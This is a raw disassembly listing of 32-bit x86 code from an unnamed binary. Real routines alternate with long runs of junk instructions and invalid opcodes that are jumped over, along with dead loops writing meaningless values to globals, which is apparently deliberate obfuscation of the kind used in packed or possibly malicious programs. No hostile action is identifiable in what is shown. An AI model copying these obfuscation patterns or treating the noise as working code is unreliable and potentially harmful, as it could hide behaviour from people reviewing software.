  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x29eb2a32
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	cs ds and edi,edx
  409492:	test   al,0x7
  409494:	in     eax,dx
  409495:	xlat   BYTE PTR ds:[ebx]
  409496:	adc    al,bh
  409498:	rcl    BYTE PTR [ebx-0x63fa62d5],cl
  40949e:	stc    
  40949f:	cmp    edi,0x4826ffb2
  4094a5:	add    al,0x31
  4094a7:	adc    eax,0xeb3dca9c
  4094ac:	fabs   
  4094ae:	sub    edx,edi
  4094b0:	jecxz  0x4094ce
  4094b2:	test   DWORD PTR [edx+0x7],edx
  4094b5:	les    edi,FWORD PTR [edi]
  4094b7:	inc    ecx
  4094b8:	push   ds
  4094b9:	jne    0x409442
  4094bb:	fwait
  4094bc:	add    ch,BYTE PTR [ecx-0x2f]
  4094bf:	dec    eax
  4094c0:	aad    0xf4
  4094c2:	stos   BYTE PTR es:[edi],al
  4094c3:	push   0xfecf1171
  4094c8:	mov    dh,0x96
  4094ca:	(bad)  
  4094cb:	pop    ecx
  4094cc:	mov    dh,0x2b
  4094ce:	sbb    dl,ah
  4094d0:	lea    ebx,fs:[eax+0x23]
  4094d4:	mov    ebp,0x55238f26
  4094d9:	leave  
  4094da:	fwait
  4094db:	sub    eax,0xf4c71dff
  4094e0:	sub    esi,DWORD PTR [edx-0x4673e78d]
  4094e6:	jge    0x409551
  4094e8:	jmp    0x8ec49fa5
  4094ed:	pushf  
  4094ee:	dec    esp
  4094ef:	lea    edi,[edx+0x1]
  4094f2:	in     al,dx
  4094f3:	pop    ss
  4094f4:	add    cl,0x37
  4094f7:	fst    QWORD PTR [ebx]
  4094f9:	gs push 0x5aaead61
  4094ff:	dec    esi
  409500:	pop    ecx
  409501:	push   ss
  409502:	cmp    esp,DWORD PTR [edx]
  409504:	jp     0x409486
  409506:	push   edx
  409507:	or     ch,BYTE PTR [eax-0x4b]
  40950a:	ja     0x40955a
  40950c:	(bad)  
  40950d:	and    ecx,ebx
  40950f:	cmp    BYTE PTR [eax+0x38],0x46
  409513:	nop
  409514:	mov    cl,0x9d
  409516:	jmp    0x3f1d:0xdce19fc8
  40951d:	pusha  
  40951e:	adc    eax,0x8b48d540
  409523:	jne    0x409535
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    ch,BYTE PTR [edx+0x915ea62]
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	cdq    
  40954b:	dec    edx
  40954c:	cs or  eax,0xb58ae474
  409552:	sti    
  409553:	fisub  WORD PTR [ecx]
  409555:	stos   BYTE PTR es:[edi],al
  409556:	and    BYTE PTR [esi],bh
  409558:	mov    edi,0x66ec18d2
  40955d:	aaa    
  40955e:	mov    esi,0x96c7266e
  409563:	push   ebx
  409564:	int3   
  409565:	jp     0x40957f
  409567:	(bad)  
  409569:	inc    ebp
  40956a:	pcmpeqw mm0,mm7
  40956d:	aam    0x80
  40956f:	stc    
  409570:	push   esi
  409571:	xchg   esp,eax
  409572:	fimul  DWORD PTR [esp+ebx*1]
  409575:	mov    al,ds:0xeccb3d3c
  40957a:	inc    esp
  40957b:	in     al,0x42
  40957d:	stos   BYTE PTR es:[edi],al
  40957e:	jnp    0x8b94b5f8
  409584:	add    al,0x1e
  409586:	inc    ebp
  409587:	mov    dl,0xd2
  409589:	ficom  DWORD PTR [edi+0xd303b4b]
  40958f:	outs   dx,BYTE PTR ds:[esi]
  409590:	adc    cl,BYTE PTR [ecx-0x3b]
  409593:	ja     0x409567
  409595:	pop    esp
  409596:	sbb    bh,BYTE PTR [ebp+0x33]
  409599:	fdiv   QWORD PTR [ebp+0x50139eb1]
  40959f:	add    BYTE PTR gs:0x2769e8e1,0x1a
  4095a7:	xchg   esp,eax
  4095a8:	xchg   BYTE PTR [edx],dl
  4095aa:	ja     0x4095e9
  4095ac:	jmp    0x4fcf:0x43caa226
  4095b3:	ficomp DWORD PTR [edi]
  4095b5:	pop    esi
  4095b6:	jmp    0xbccc:0xb8d33680
  4095bd:	rcr    BYTE PTR [edx+eiz*2],0x1c
  4095c1:	add    DWORD PTR [edi],edi
  4095c3:	(bad)  
  4095c4:	ins    DWORD PTR es:[edi],dx
  4095c5:	or     BYTE PTR [edi-0x4f01a439],0x2f
  4095cc:	pop    ebp
  4095cd:	jmp    0x585b:0xfd3c4594
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	cmp    al,0x9
  4095d7:	idiv   BYTE PTR [ecx*2+0x394ffe31]
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    ebp,DWORD PTR [ecx-0x62777758]
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409619
  409628:	xchg   BYTE PTR [edi+0x20],ch
  40962b:	adc    eax,0x82a9adc
  409630:	lea    ebp,[esi-0x43434b23]
  409636:	pusha  
  409637:	(bad)  
  409638:	ds stc 
  40963a:	adc    eax,0x5a0a47ee
  40963f:	push   ebp
  409640:	or     al,0x9e
  409642:	sahf   
  409643:	scas   eax,DWORD PTR es:[edi]
  409644:	add    DWORD PTR [eax+eiz*8],ebp
  409647:	ret    0xa155
  40964a:	xlat   BYTE PTR ds:[ebx]
  40964b:	in     al,0xfe
  40964d:	ror    BYTE PTR [edi-0x30],1
  409650:	xchg   ah,bl
  409652:	or     al,0x98
  409654:	sub    edi,DWORD PTR [edi+0x107407ff]
  40965a:	aam    0x40
  40965c:	mov    ebp,0x6afda4e5
  409661:	add    cl,BYTE PTR [edi]
  409663:	aaa    
  409664:	inc    esp
  409665:	mov    eax,0x78c1b7a4
  40966a:	dec    edx
  40966b:	(bad)  
  40966c:	sbb    DWORD PTR ds:0xda92417,ebx
  409672:	jp     0x409617
  409674:	push   ds
  409675:	mov    edx,0x2da8f0e4
  40967a:	or     DWORD PTR [ecx-0x398ef6c4],ecx
  409680:	shl    BYTE PTR [edx],cl
  409682:	cwde   
  409683:	jnp    0x4096d7
  409685:	in     eax,dx
  409686:	adc    BYTE PTR [ebx],cl
  409688:	pusha  
  409689:	adc    eax,0x43b541d1
  40968e:	je     0x409644
  409690:	das    
  409691:	ror    DWORD PTR [edx+0x41],1
  409694:	or     ebx,esi
  409696:	dec    ecx
  409697:	inc    ebp
  409698:	push   0xe5d8df0e
  40969d:	mov    edx,0x4710d021
  4096a2:	and    edx,ebp
  4096a4:	test   BYTE PTR [eax],al
  4096a6:	ss xor eax,0x4891cf5
  4096ac:	daa    
  4096ad:	dec    esi
  4096ae:	shl    BYTE PTR ds:0x9b338d39,1
  4096b4:	cmp    edi,edx
  4096b6:	ficomp DWORD PTR [eax]
  4096b8:	nop
  4096b9:	sub    DWORD PTR [eax-0x7de4c3b1],eax
  4096bf:	in     al,0xc7
  4096c1:	imul   esp
  4096c3:	push   edx
  4096c4:	mov    ecx,DWORD PTR [edx]
  4096c6:	dec    ebx
  4096c7:	test   DWORD PTR [ebp-0x7bafd681],ecx
  4096cd:	xchg   ebp,eax
  4096ce:	push   0xf4fd7d7d
  4096d3:	lods   eax,DWORD PTR ds:[esi]
  4096d4:	cmp    ebp,DWORD PTR [eax+0x3c]
  4096d7:	stos   DWORD PTR es:[edi],eax
  4096d8:	cmp    DWORD PTR [esi],ebx
  4096da:	int3   
  4096db:	test   al,0x2d
  4096dd:	repz inc ecx
  4096df:	cdq    
  4096e0:	push   0x6e8598e3
  4096e5:	mov    eax,ds:0x1332dcd8
  4096ea:	(bad)  
  4096eb:	jmp    0x5407:0x82ebad66
  4096f2:	mov    esp,0x78d13a55
  4096f7:	addr16 mov ds:0x33b0,al
  4096fb:	fld    DWORD PTR [esi-0x45]
  4096fe:	repz pop ds
  409700:	sbb    al,0xc2
  409702:	pop    ebp
  409703:	xchg   ebx,eax
  409704:	scas   eax,DWORD PTR es:[edi]
  409705:	add    DWORD PTR [eax],ebx
  409707:	cld    
  409708:	adc    esp,0x13de89d2
  40970e:	loope  0x4096e1
  409710:	lods   al,BYTE PTR ds:[esi]
  409711:	out    dx,al
  409712:	xchg   ebp,eax
  409713:	jno    0x409771
  409715:	dec    edx
  409716:	jns    0x4096d7
  409718:	adc    DWORD PTR [ebp-0x77],edx
  40971b:	(bad)  
  40971c:	mov    edx,DWORD PTR [ecx-0x1975d410]
  409722:	in     al,0x4f
  409724:	dec    edx
  409725:	test   al,0x60
  409727:	jl     0x409786
  409729:	jnp    0x409763
  40972b:	push   cs
  40972c:	dec    edx
  40972d:	pop    edx
  40972e:	sub    BYTE PTR [ecx],ah
  409730:	out    0x1b,eax
  409732:	xor    al,0x7b
  409734:	jle    0x4096f8
  409736:	fucom  st(5)
  409738:	mov    dh,0x54
  40973a:	jle    0x4096ef
  40973c:	div    DWORD PTR [ebx+0x342be507]
  409742:	ss cmp eax,0xca318b71
  409748:	lahf   
  409749:	xor    eax,0xda0bc91d
  40974e:	xor    edx,DWORD PTR [ecx+0x1b]
  409751:	rol    bh,1
  409753:	inc    ebp
  409754:	cld    
  409755:	cmp    al,0x85
  409757:	pushf  
  409758:	clc    
  409759:	or     DWORD PTR ds:0x4235bf,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4235db,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4235cb
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	cmp    BYTE PTR [ecx+ebp*4-0x24],bh
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x40983f
  4097cc:	pop    ebp
  4097cd:	sbb    eax,0x82d2970e
  4097d2:	jbe    0x40975a
  4097d4:	jle    0x40984a
  4097d6:	(bad)  
  4097d7:	adc    al,0xc7
  4097d9:	jl     0x409792
  4097db:	push   edx
  4097dc:	int3   
  4097dd:	cmc    
  4097de:	xchg   BYTE PTR [ebp+edx*2+0x24496d34],bh
  4097e5:	in     eax,dx
  4097e6:	mov    esp,0xa6495f5f
  4097eb:	push   cs
  4097ec:	add    eax,0xd645e6f7
  4097f1:	out    dx,al
  4097f2:	jecxz  0x409863
  4097f4:	push   ebx
  4097f5:	aas    
  4097f6:	in     al,dx
  4097f7:	mov    cl,al
  4097f9:	div    BYTE PTR [edi-0x67]
  4097fc:	dec    esp
  4097fd:	ficom  WORD PTR [esi+edi*2]
  409800:	add    ebp,edx
  409802:	mov    eax,ds:0x71af70fb
  409807:	adc    al,0xf9
  409809:	hlt    
  40980a:	mov    edx,DWORD PTR [eax+ebp*2]
  40980d:	xchg   DWORD PTR ds:0x7069acbe,eax
  409813:	shl    BYTE PTR [ecx],cl
  409815:	jp     0x4097a2
  409817:	pop    ds
  409818:	sub    BYTE PTR [eax-0x23ad270b],0xf4
  40981f:	mov    eax,ds:0x5184fa96
  409824:	arpl   WORD PTR [edi+ebp*1-0x26],sp
  409828:	(bad)  
  409829:	aas    
  40982a:	jo     0x40981c
  40982c:	add    ch,BYTE PTR [esi]
  40982e:	jge    0x409877
  409830:	mov    dl,0x95
  409832:	ds in  eax,0xf8
  409835:	pusha  
  409836:	push   ecx
  409837:	mov    edx,0x53a427a8
  40983c:	aad    0x8d
  40983e:	stos   DWORD PTR es:[edi],eax
  40983f:	and    bl,BYTE PTR ds:0x56433ff9
  409845:	add    dl,BYTE PTR [edi-0x64]
  409848:	mov    ds:0xa98864b7,eax
  40984d:	push   ds
  40984e:	pop    ecx
  40984f:	in     eax,dx
  409850:	xchg   edx,eax
  409851:	add    DWORD PTR [ebp-0x28183d75],ecx
  409857:	cld    
  409858:	pusha  
  409859:	sbb    DWORD PTR [eax+0x301efdb4],esp
  40985f:	sub    ecx,DWORD PTR [ebp+0x57]
  409862:	fmul   DWORD PTR [ebx+0x50]
  409865:	popa   
  409866:	cmp    eax,DWORD PTR [ebx+0x35]
  409869:	sar    bl,cl
  40986b:	mov    ?,WORD PTR [esi-0x5e]
  40986e:	lods   al,BYTE PTR ds:[esi]
  40986f:	adc    BYTE PTR [ebp+esi*1+0x4],ch
  409873:	js     0x4098b8
  409875:	rcr    ch,1
  409877:	loope  0x409853
  409879:	dec    eax
  40987a:	xchg   DWORD PTR [ebp+ecx*1+0x76],esp
  40987e:	pop    edi
  40987f:	rol    eax,1
  409881:	cmp    eax,0xdd356066
  409886:	add    dh,cl
  409888:	pusha  
  409889:	sar    BYTE PTR [eax],1
  40988b:	es (bad) 
  40988d:	xchg   edx,eax
  40988e:	inc    eax
  40988f:	and    BYTE PTR [edx],al
  409891:	mov    edi,0x841f8696
  409896:	or     bl,BYTE PTR [eax+eiz*8-0x2]
  40989a:	push   esp
  40989b:	das    
  40989c:	ror    BYTE PTR [ebx],1
  40989e:	jnp    0x40989e
  4098a0:	int    0x8d
  4098a2:	ret    0xfa00
  4098a5:	and    DWORD PTR [ebx],0x71
  4098a8:	add    DWORD PTR [ecx+0x1a],eax
  4098ab:	shl    BYTE PTR fs:[edx],cl
  4098ae:	adc    esp,DWORD PTR [eax+0x7f]
  4098b1:	test   BYTE PTR [esi-0x29],bh
  4098b4:	push   ecx
  4098b5:	ja     0x40984f
  4098b7:	pop    edx
  4098b8:	inc    esp
  4098b9:	sbb    al,BYTE PTR [esi]
  4098bb:	lahf   
  4098bc:	mov    bh,0xfe
  4098be:	call   0xb2b5e84
  4098c3:	adc    eax,0x14c9be4f
  4098c8:	retf   0xccb7
  4098cb:	icebp  
  4098cc:	sbb    al,0x47
  4098ce:	push   ecx
  4098cf:	mov    eax,ds:0xa545f7b4
  4098d4:	sar    ebx,cl
  4098d6:	mov    dl,dl
  4098d8:	xchg   esp,eax
  4098d9:	(bad)  
  4098db:	das    
  4098dc:	ins    BYTE PTR es:[edi],dx
  4098dd:	and    al,0xc
  4098df:	mov    esi,0xbc75d689
  4098e4:	int3   
  4098e5:	push   0xec410b68
  4098ea:	inc    edx
  4098eb:	xor    al,0x93
  4098ed:	(bad)  
  4098ee:	in     al,dx
  4098ef:	cs push 0x458baede
  4098f5:	adc    al,0x81
  4098f7:	and    eax,0x412364
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xef2fe64c
  409977:	xchg   DWORD PTR [ebp+0x27],ebp
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x40990b
  409981:	mov    eax,0x3d87ad84
  409986:	arpl   WORD PTR [ebp+0x2a],ax
  409989:	aas    
  40998a:	dec    ebp
  40998b:	and    al,0xd9
  40998d:	jns    0x40992c
  40998f:	(bad)  
  409991:	sub    eax,0x8c061c23
  409996:	dec    esi
  409997:	pop    edi
  409998:	imul   ebx,DWORD PTR [edx-0x37],0xb65fb0c2
  40999f:	xor    eax,0x1b6c170e
  4099a4:	or     bh,BYTE PTR [edx+ecx*1]
  4099a7:	inc    edi
  4099a8:	es scas al,BYTE PTR es:[edi]
  4099aa:	outs   dx,BYTE PTR ds:[esi]
  4099ab:	push   edi
  4099ac:	clc    
  4099ad:	mov    ch,0xdb
  4099af:	mov    ebp,0xa36e0d32
  4099b4:	sbb    al,0x16
  4099b6:	push   ss
  4099b7:	jg     0x4099b8
  4099b9:	cmp    eax,DWORD PTR [edx-0x3441bac7]
  4099bf:	ffreep st(4)
  4099c1:	mov    edi,0xb3dc3b26
  4099c6:	push   eax
  4099c7:	shr    DWORD PTR [ebx-0x71],cl
  4099ca:	adc    bl,dh
  4099cc:	in     eax,dx
  4099cd:	cmc    
  4099ce:	or     BYTE PTR [eax-0x6c79c24d],dl
  4099d4:	mov    eax,0x4e89d6e9
  4099d9:	add    ch,BYTE PTR [edx]
  4099db:	sub    esi,ebx
  4099dd:	mov    edx,0xc3b303c7
  4099e2:	test   eax,0x4c31206c
  4099e7:	xchg   esp,eax
  4099e8:	xor    esi,DWORD PTR [edi+0x2018405]
  4099ee:	cmp    al,0xf1
  4099f0:	lock loopne 0x409a1c
  4099f3:	into   
  4099f4:	cmp    al,0x52
  4099f6:	fwait
  4099f7:	mov    bl,0x7
  4099f9:	ret    
  4099fa:	dec    ebp
  4099fb:	mov    bh,0x1d
  4099fd:	aas    
  4099fe:	retf   
  4099ff:	mov    ds:0x1132bde3,eax
  409a04:	cmp    cl,BYTE PTR [ecx]
  409a06:	in     al,dx
  409a07:	jae    0x4099d5
  409a09:	sahf   
  409a0a:	outs   dx,BYTE PTR ds:[esi]
  409a0b:	push   es
  409a0c:	daa    
  409a0d:	out    0x31,al
  409a0f:	push   ds
  409a10:	pop    eax
  409a11:	jae    0x4099b1
  409a13:	and    DWORD PTR [eax],eax
  409a15:	push   cs
  409a16:	retf   
  409a17:	out    dx,eax
  409a18:	push   esi
  409a19:	push   0x1de54000
  409a1e:	pop    es
  409a1f:	sahf   
  409a20:	ret    
  409a21:	pop    es
  409a22:	adc    eax,0x2122cc25
  409a27:	add    al,0x82
  409a29:	in     al,dx
  409a2a:	mov    edx,0xae4f2899
  409a2f:	xor    DWORD PTR [ecx+0x3f38c6f5],ecx
  409a35:	jne    0x409a43
  409a37:	push   esi
  409a38:	retf   0xbefd
  409a3b:	sub    BYTE PTR [edx+0x67c7f895],al
  409a41:	sbb    BYTE PTR [esi-0x218685b8],al
  409a47:	jp     0x4099f2
  409a49:	pop    esp
  409a4a:	popa   
  409a4b:	dec    edx
  409a4c:	out    0xd7,al
  409a4e:	std    
  409a4f:	jmp    0x77f5:0x892af09d
  409a56:	sbb    eax,0x68d5ee6f
  409a5b:	(bad)  
  409a5c:	jbe    0x409a3c
  409a5e:	les    edi,FWORD PTR [edi+eiz*1-0x6b7b102b]
  409a65:	(bad)  
  409a66:	push   ds
  409a67:	and    dl,BYTE PTR [ebp-0x7c]
  409a6a:	mov    esi,0x8ca4ebfc
  409a6f:	jno    0x409a2a
  409a71:	aam    0x4f
  409a73:	and    BYTE PTR [ebx],al
  409a75:	(bad)  
  409a76:	out    0x40,al
  409a78:	pop    eax
  409a79:	test   eax,0x5d842992
  409a7e:	imul   ebx,DWORD PTR [esi+0x6d],0x1a
  409a82:	jbe    0x409ae8
  409a84:	adc    BYTE PTR [ebx],cl
  409a86:	xor    al,0xdd
  409a88:	push   ebp
  409a89:	fcomip st,st(3)
  409a8b:	or     DWORD PTR [ecx+0x637b99b3],ebp
  409a91:	and    BYTE PTR [eax+0x32],ah
  409a94:	bound  ebx,QWORD PTR [esi+0x62]
  409a97:	or     eax,DWORD PTR [ebx+0x59]
  409a9a:	mov    DWORD PTR ds:0x7cb691b,ecx
  409aa0:	shl    BYTE PTR [ecx],cl
  409aa2:	inc    ebx
  409aa3:	pop    ebx
  409aa4:	stos   BYTE PTR es:[edi],al
  409aa5:	sub    bl,cl
  409aa7:	stos   BYTE PTR es:[edi],al
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4235c7
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4235d3,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4235d3,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4235c3
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4235d3,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4235c3,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4235bf
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
